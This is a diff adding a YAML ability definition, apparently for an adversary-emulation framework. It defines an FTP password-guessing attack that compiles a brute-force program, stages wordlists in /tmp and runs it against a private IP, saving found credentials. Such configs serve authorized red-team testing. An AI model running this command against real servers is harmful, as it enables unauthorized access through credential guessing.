@@ -1,0 +1,38 @@
+- tactic: initial-access
+  technique_name: 'Brute Force: Password Guessing'
+  technique_id: TB004
+  name: FTP brute force
+  description: Using 15 common usernames and 100 common passwords, this abilities
+    finds out if a combination of that usernames and passwords exists in the ftp server
+    (represented by the ip address given as a parameter of the binary file). If so,
+    the correct combination is stored inside /tmp/found.txt
+  executors:
+  - name: sh
+    platform: linux
+    command: g++ -std=c++11 ftp_brute_force.cpp -o /tmp/ftp_brute_force; mv usernames.txt
+      /tmp/usernames.txt; mv passwords.txt /tmp/passwords.txt; /tmp/ftp_brute_force
+      192.168.3.10
+    code: null
+    language: null
+    build_target: null
+    payloads:
+    - usernames.txt
+    - passwords.txt
+    - ftp_brute_force.cpp
+    uploads: []
+    timeout: 7200
+    parsers: []
+    cleanup: []
+    variations: []
+    additional_info: {}
+  requirements: []
+  privilege: ''
+  repeatable: false
+  buckets:
+  - initial-access
+  additional_info: {}
+  access: {}
+  singleton: false
+  plugin: ''
+  delete_payload: true
+  id: 3c3e9aaf-cc78-418b-84b6-c63cdd58fd9b
